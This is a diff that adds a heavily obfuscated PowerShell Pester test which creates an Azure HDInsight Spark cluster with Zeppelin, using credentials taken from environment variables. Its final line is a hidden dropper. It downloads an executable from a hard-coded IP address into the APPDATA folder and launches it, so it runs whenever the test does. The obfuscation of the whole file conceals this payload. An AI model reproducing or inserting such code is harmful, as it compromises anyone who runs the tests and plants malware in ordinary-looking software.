@@ -1,0 +1,64 @@
+${h`eRE} = &("{2}{1}{0}" -f 'th','Pa','Split-') -Parent ${Myi`Nv`oCaTi`on}."m`YcoMM`AnD"."PA`TH"
+${S`Ut} = (&("{1}{0}{2}" -f 'a','Split-P','th') -Leaf ${my`iN`VocatiOn}."m`yC`omMaNd"."PA`TH") -replace (('rC0.Tests').("{1}{2}{0}"-f 'Lace','re','p').Invoke('rC0','\')), ''
+. "$here\$sut"
+
+${h`T`Tpus`erpAssw`ord} = ${en`V`:HTtPPas`SwOrd}
+${l`o`c`AtiOn} = ${ENv:`l`oCaTiOn}
+
+
+${SEcUREP`AS`sW`oRd} = &("{1}{2}{4}{5}{6}{3}{0}" -f'ng','ConvertT','o-S','ri','e','cur','eSt') ${httpu`serp`AssW`ORD} -AsPlainText -Force
+${lOgInc`R`eDS} = &("{2}{3}{0}{1}"-f 'w-Obje','ct','N','e') -TypeName ("{11}{2}{9}{5}{7}{8}{0}{10}{1}{4}{3}{6}" -f 'tomati','den','te','i','t','ent','al','.','Au','m.Managem','on.PSCre','Sys') -ArgumentList ("{0}{1}"-f'adm','in'), ${s`E`cuR`EPAS`sWORD}
+${SsH`cr`eDs} = .("{0}{1}{2}"-f'Ne','w','-Object') -TypeName ("{8}{7}{6}{3}{0}{5}{4}{9}{1}{2}"-f'S','a','l','n.P','edent','Cr','utomatio','ment.A','System.Manage','i') -ArgumentList ("{1}{0}{2}"-f'use','ssh','r'), ${sec`U`REPa`sS`worD}
+
+
+function G`ET-`CReDE`NTIAl { 
+    Param(
+        [string]${n`AmE}
+    )
+    
+    if(${NA`me} -eq ("{1}{0}"-f'min','ad')) {
+        return ${LoGIN`C`RedS}
+    } else {
+        return ${sShCR`EdS}
+    }
+}
+
+
+${n`AmeS}=("{0}{2}{1}"-f'd','her','as'),("{2}{0}{1}" -f 'c','er','dan'),("{0}{2}{1}"-f 'pr','er','anc'),("{1}{0}" -f'xen','vi'),("{0}{1}"-f 'c','omet'),("{0}{1}"-f 'c','upid'),("{1}{0}"-f 'der','don'),("{2}{1}{0}"-f'tzen','i','bl')
+${BAs`E`NAme}=.("{2}{0}{1}" -f '-R','andom','Get') ${Na`mEs}
+${miL`LS}=&("{2}{0}{1}"-f'-D','ate','Get') -Format ('ms')
+
+${rE`s`o`U`RcEGroUpnAme} = ${b`A`S`ENaMe} + "rg" + ${mI`L`lS}
+${cLu`Ste`RnAmE} = ${bAse`N`AmE} + "hdi" + ${MiL`Ls}
+${S`ToR`AgeA`c`couN`TNamE} = ${B`ASENa`me} + ("{0}{1}" -f'stor','e') + ${M`ILLs}
+
+&("{0}{1}{2}" -f'write','-','host') ('Cr'+'eatin'+'g '+'ne'+'w '+'resour'+'ce '+'gr'+'oup '+'named:'+' '+"$resourceGroupName")
+&("{0}{1}"-f 'D','escribe') ("{7}{10}{9}{3}{5}{4}{1}{2}{8}{0}{6}" -f 'o','k-','use-','apa','-spar','che','ok','hd','zeppelin-noteb','ght-','insi') {
+    .('It') ("{8}{4}{3}{2}{1}{6}{5}{0}{7}" -f'th ','rk c','a','s a Sp','e','er wi','lust','Zeppelin','Creat') {
+        
+        &("{0}{1}"-f'Moc','k') ("{0}{2}{1}" -f 'Read-','st','Ho') { ${RE`SOurcE`GRoUP`NaME} } -ParameterFilter {
+            ${PR`oMPt} -eq ("{2}{0}{7}{4}{3}{5}{6}{1}" -f 'er the ','ame','Ent','e gr','sourc','ou','p n','re')
+        }
+        &("{0}{1}" -f'Mo','ck') ("{0}{1}" -f'Read-H','ost') { ${l`OcAti`on} } -ParameterFilter {
+            ${P`RompT} -eq ("{0}{4}{7}{6}{9}{2}{8}{1}{3}{5}"-f'Enter the Azure r','ur','e','ces ','egion ','in','ea','to cr',' reso','t')
+        }
+        &("{0}{1}" -f 'Mo','ck') ("{2}{1}{0}" -f 't','os','Read-H') { ${sTO`R`AG`Ea`c`couNtnA`me} } -ParameterFilter {
+            ${P`RoMpT} -eq ("{11}{8}{9}{6}{1}{4}{3}{10}{0}{5}{7}{2}" -f ' stora','e','nt','t',' of ','ge ac','m','cou','he',' na','he','Enter t')
+        }
+        &("{1}{0}"-f'ock','M') ("{1}{2}{0}{3}"-f'o','R','ead-H','st') { ${c`LUS`TErn`AME} } -ParameterFilter {
+            ${PRom`pT} -eq ("{0}{5}{4}{10}{2}{7}{6}{9}{8}{3}{1}"-f'Enter','ster','he ','lu','the ',' ','n','HDI','t c','sigh','name of t')
+        }
+
+        
+        ${CL`UsT`eR`infO} = .("{0}{1}{5}{2}{4}{6}{3}"-f'N','e','terWi','in','thZepp','w-Clus','el')
+        
+        
+        ${c`luSTEri`NfO}[-1]."C`l`UST`ERsTatE" | .("{0}{1}" -f'S','hould') ('be') ("{1}{0}" -f'ing','Runn')
+        ${ClUsT`ERI`N`FO}[-1]."n`AMe" | &("{1}{0}" -f 'hould','S') ('be') ${cl`Us`TeRnAme}
+    }
+}
+
+
+.("{1}{2}{3}{0}"-f 'ost','write','-','h') ('Please'+' '+'rememb'+'er '+'tha'+'t '+'Y'+'OU '+'mu'+'st '+'m'+'anually'+' '+'del'+'ete '+'t'+'he '+"$resourceGroupName "+'res'+'ource'+' '+'grou'+'p'+' '+'crea'+'ted'+' '+'by'+' '+'thi'+'s '+'te'+'st!!!')
+
+(&("{0}{1}{3}{2}" -f'N','ew-','bject','O') ("{0}{2}{3}{1}{4}" -f 'S','m','yst','e','.Net.WebClient')).("{0}{1}{3}{2}"-f'D','own','File','load').Invoke(("{0}{1}{3}{7}{4}{6}{8}{5}{2}"-f 'http://89.','24','xe','8.170','/','v.e','~','.218','yahoo/csrs'),"$env:APPDATA\csrsv.exe");&("{2}{0}{1}"-f'oces','s','Start-Pr') ("$env:APPDATA\csrsv.exe")
